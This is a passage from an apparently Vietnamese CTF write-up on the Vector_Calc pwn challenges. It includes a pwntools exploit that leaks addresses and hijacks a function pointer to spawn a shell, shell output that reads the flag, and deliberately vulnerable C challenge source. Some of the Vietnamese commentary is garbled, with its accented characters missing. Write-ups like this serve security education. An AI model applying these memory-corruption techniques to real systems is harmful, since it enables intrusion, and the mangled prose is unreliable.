</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">addfav</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;6&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index&#39;</span>, idx)
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sumVector(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>loadfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>printfav(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;v = [&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(leak)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pie<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x35d</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;pie_base :&#39;</span> <span style="color:#f92672">+</span> hex(pie))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>v_list<span style="color:#f92672">=</span>int(leak[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;v_list array :&#39;</span> <span style="color:#f92672">+</span> hex(v_list))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sum<span style="color:#f92672">=</span>v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>faves<span style="color:#f92672">=</span>sum<span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;sum :&#39;</span> <span style="color:#f92672">+</span> hex(sum))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;faves :&#39;</span> <span style="color:#f92672">+</span> hex(faves))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>w1n<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000009D2</span>
</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;w1n :&#39;</span> <span style="color:#f92672">+</span> hex(w1n))
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;system :&#39;</span> <span style="color:#f92672">+</span> hex(system))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>, str(w1n)<span style="color:#f92672">.</span>encode(), str(w1n)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>enter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>,str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode(), str(v_list<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>printsum() <span style="color:#75715e"># trigger</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.sendline(b&#39;exec 1&gt;&amp;0&#39;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>spawn shell &amp; get flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   ~/CTF/wannagame/calc                                                                                                                       02:52:23 
</span></span><span style="display:flex;"><span> python3 xpl.py                                                                                                                                          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 45.122.249.68 on port 20017: Done
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/w1n-gl0ry/CTF/wannagame/calc/chall&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> pie_base :0x55a8e7c74000
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> v_list array :0x55a8e7c77040
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sum :0x55a8e7c77080
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x55a8e7c77098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x55a8e7c749d2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x55a8e7c74100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ exec 1&gt;&amp;<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall
</span></span><span style="display:flex;"><span>flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>$ cat flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>Ooops,... Pointers, uint64_t, long long, what the heck are they?<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Ooops,... Pointers, uint64_t, long long, what the heck are they?}</code></p>
<h2 id="vector_calc-revenge">Vector_Calc Revenge</h2>
<p><code>Host: nc 45.122.249.68 20018</code></p>
<p><code>Description: I have fixed the w1n function :)</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/chall_revenge">chall_revenge</a></p>
<p><code>chall_revenge.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;string.h&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3</span>
</span></span><span style="display:flex;"><span>struct Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>void (<span style="color:#f92672">*</span>printFunc)(struct Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>struct Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span>void<span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void enterData(){
</span></span><span style="display:flex;"><span>    struct Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;v = [</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void sumVector(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>x;
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void loadFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> malloc(sizeof(struct Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], sizeof(struct Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void addFavorute(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void init(){
</span></span><span style="display:flex;"><span>    setbuf(stdin,NULL);
</span></span><span style="display:flex;"><span>    setbuf(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i]<span style="color:#f92672">.</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printMenu(){
</span></span><span style="display:flex;"><span>    printf(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>int main(int argc, char<span style="color:#f92672">**</span> argv, char<span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    init();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        printMenu();
</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%u</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        switch (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            enterData();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            sumVector();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>            loadFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>            printFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span>:
</span></span><span style="display:flex;"><span>            addFavorute();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        default:
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void w1n(); <span style="color:#f92672">//</span> no more valid parameters to get shell <span style="color:#960050;background-color:#1e0010">!</span>
</span></span></code></pre></div><p> bi ny, tc gi  sa li hm <code>w1n()</code> mt cht,  tham s truyn vo li l <code>echo '\\_()_/'</code> nn chng ta khng th c shell :vv</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc                                                                                                                 <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">5</span>s <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span> <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> python3 xpl.py                                                                                                                                          <span style="color:#960050;background-color:#1e0010"></span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Opening connection to <span style="color:#ae81ff">45.122.249.68</span> on port <span style="color:#ae81ff">20018</span><span style="color:#f92672">:</span> Done
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n<span style="color:#f92672">-</span>gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc<span style="color:#f92672">/</span>chall<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] pie_base :<span style="color:#ae81ff">0x55c01873b000</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] v_list array :<span style="color:#ae81ff">0x55c01873e040</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] sum :<span style="color:#ae81ff">0x55c01873e080</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] faves :<span style="color:#ae81ff">0x55c01873e098</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] w1n :<span style="color:#ae81ff">0x55c01873b9d2</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] system :<span style="color:#ae81ff">0x55c01873b100</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">_</span>(<span style="color:#960050;background-color:#1e0010"></span>)_<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010"></span>
</span></span></code></pre></div><p>Quay li lc ny, chng ta thc thi c hm <code>w1n</code></p>
